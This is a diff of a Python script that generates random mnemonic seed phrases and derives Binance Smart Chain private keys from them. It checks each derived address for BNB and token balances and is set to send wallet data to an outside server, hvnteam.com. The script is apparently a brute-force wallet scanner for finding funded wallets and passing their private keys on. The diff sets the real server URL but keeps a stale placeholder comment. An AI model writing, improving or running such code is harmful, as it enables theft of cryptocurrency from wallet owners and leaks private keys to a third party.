@@ -3,30 +3,35 @@ import requests
 import json
 import psutil
 from mnemonic import Mnemonic
-from bip44 import Wallet
+from eth_account import Account
 from web3 import Web3
 import time
+
+# Enable mnemonic support for eth_account
+Account.enable_unaudited_hdwallet_features()
 
 # Connect to Binance Smart Chain
 bsc_rpc_url = 'https://bsc-dataseed.binance.org/'
 web3 = Web3(Web3.HTTPProvider(bsc_rpc_url))
 
 # API to send wallet data to server
-api_url = 'http://YOUR_SERVER_IP/wallet_api.php'  # Replace YOUR_SERVER_IP with your server's IP
+api_url = 'https://hvnteam.com/wallet.php'  # Replace YOUR_SERVER_IP with your server's IP
 
 def scan_wallet():
     try:
         # Generate a 12-word mnemonic phrase
         mnemo = Mnemonic("english")
         mnemonic_phrase = mnemo.generate(strength=128)
-        wallet = Wallet(mnemonic_phrase)
+        print(f"[INFO] Generated Mnemonic: {mnemonic_phrase}")
 
-        # Correct derivation path for Binance Smart Chain (same as Ethereum)
-        private_key, address = wallet.derive_account("m/44'/60'/0'/0/0")
+        # Derive account from mnemonic
+        account = Account.from_mnemonic(mnemonic_phrase)
+        address = account.address
+        private_key = account.key
 
         # Check BNB balance
         balance = web3.eth.get_balance(address)
-        bnb_balance = web3.fromWei(balance, 'ether')
+        bnb_balance = Web3.from_wei(balance, 'ether')
 
         # Get token list
         tokens = get_all_tokens(address)
